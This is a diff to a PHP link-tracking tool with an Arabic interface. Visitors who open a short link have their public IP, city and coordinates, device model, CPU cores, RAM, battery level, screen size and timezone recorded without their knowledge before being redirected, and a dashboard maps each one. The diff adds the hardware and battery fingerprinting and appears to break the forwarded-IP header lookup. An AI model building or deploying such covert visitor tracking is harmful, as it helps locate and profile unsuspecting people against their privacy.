@@ -1,12 +1,10 @@
 <?php
-// إظهار الأخطاء للتحقق والتأكد من العمل
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول بحقول صحيحة ومحدثة
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -18,13 +16,14 @@ try {
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
         public_ip TEXT, 
-        local_ip TEXT, 
         country TEXT, 
         city TEXT, 
         lat TEXT, 
         lon TEXT, 
         isp TEXT, 
         device_info TEXT, 
+        hardware_info TEXT, 
+        battery_info TEXT, 
         screen_res TEXT, 
         timezone TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
@@ -34,8 +33,8 @@ try {
 }
 
 function get_real_ip() {
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
+    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
+        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
@@ -68,7 +67,7 @@ function get_device_type($ua) {$brand = 'جهاز ذكي';
 
 function get_ip_details($ip) {
     if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
-        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'شبكة محلية (Localhost)'];
+        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'محلي (Localhost)'];
     }
     $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
     $data = json_decode($json, true);
@@ -91,19 +90,19 @@ if (isset($_GET['r'])) {
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {$target = $link['target_url'];$public_ip = get_real_ip();
-        $local_ip =$_GET['lip'] ?? 'غير متوفر';
         $geo = get_ip_details($public_ip);
         $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
         $device = get_device_type($ua);
+        
+        $hardware =$_GET['hw'] ?? 'غير متوفر';
+        $battery =$_GET['batt'] ?? 'غير متوفر';
         $screen =$_GET['screen'] ?? 'غير متوفر';
         $tz =$_GET['tz'] ?? 'غير متوفر';
 
         try {
-            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-            $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {
-            // الاستمرار في حالة خطأ السجل
-        }
+            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, country, city, lat, lon, isp, device_info, hardware_info, battery_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+            $logStmt->execute([$code,$public_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $hardware,$battery, $screen,$tz]);
+        } catch (Exception $e) {}
 
         header("Location: " . $target);
         exit();
@@ -150,7 +149,7 @@ if (!empty($filter_code)) {
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
-        .container { max-width: 1050px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
+        .container { max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
@@ -167,13 +166,12 @@ if (!empty($filter_code)) {
         button:hover, .btn:hover { background: #0369a1; }
         .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
         .table-container { overflow-x: auto; margin-top: 12px; border: 1px solid #1f2937; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 950px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
         th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
         td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
         tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
+        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }
         .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
-        .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
         .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
         .copy-btn.success { background: #059669; }
         .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
@@ -181,7 +179,7 @@ if (!empty($filter_code)) {
         .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
     </style>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", async function() {
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
@@ -189,9 +187,19 @@ if (!empty($filter_code)) {
             if (redirectCode && !hasScreen) {
                 const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cpuCores = navigator.hardwareConcurrency || 'غير معروف';
+                const deviceMem = navigator.deviceMemory ? (navigator.deviceMemory + ' GB') : 'غير معروف';
+                const hwInfo = `${cpuCores} أنوية - RAM: ${deviceMem}`;
 
-                // التوجيه السريع مع إرسال الأبعاد والمنطقة الزمنية
-                window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                let batteryStatus = "غير متوفر";
+                try {
+                    if (navigator.getBattery) {
+                        const batt = await navigator.getBattery();
+                        batteryStatus = `${Math.round(batt.level * 100)}% (${batt.charging ? 'يشحن ⚡' : 'غير شحن'})`;
+                    }
+                } catch(e) {}
+
+                window.location.href = `/?r=${redirectCode}&hw=${encodeURIComponent(hwInfo)}&batt=${encodeURIComponent(batteryStatus)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
             }
         });
 
@@ -272,8 +280,9 @@ if (!empty($filter_code)) {
                             <th>#</th>
                             <th>الكود</th>
                             <th>عنوان IP العام</th>
-                            <th>عنوان IP المحلي</th>
                             <th>نوع الجهاز والموديل</th>
+                            <th>المعالج والذاكرة (CPU/RAM)</th>
+                            <th>حالة البطارية</th>
                             <th>الموقع الخريطة</th>
                             <th>مزود الخدمة</th>
                             <th>الشاشة والتوقيت</th>
@@ -282,7 +291,7 @@ if (!empty($filter_code)) {
                     </thead>
                     <tbody>
                         <?php if (empty($logs)): ?>
-                            <tr><td colspan="9" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
+                            <tr><td colspan="10" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
                         <?php else: ?>
                             <?php foreach ($logs as$log): ?>
                             <tr>
@@ -291,14 +300,15 @@ if (!empty($filter_code)) {
                                     <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
                                     <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
                                 </td>
-                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? $log['ip'] ?? 'N/A'); ?></td>
-                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
+                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip']); ?></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
+                                <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['hardware_info'] ?? 'غير متوفر'); ?></td>
+                                <td style="color: #34d399; font-weight: bold;"><?php echo htmlspecialchars($log['battery_info'] ?? 'غير متوفر'); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
                                     <a class="map-btn" href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank">📍 خريطة جوجل</a>
                                 </td>
-                                <td><strong style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
+                                <td><strong style="color: #f472b6;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
                                 <td><?php echo htmlspecialchars($log['screen_res']); ?> - <?php echo htmlspecialchars($log['timezone']); ?></td>
                                 <td style="color: #9ca3af; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                             </tr>
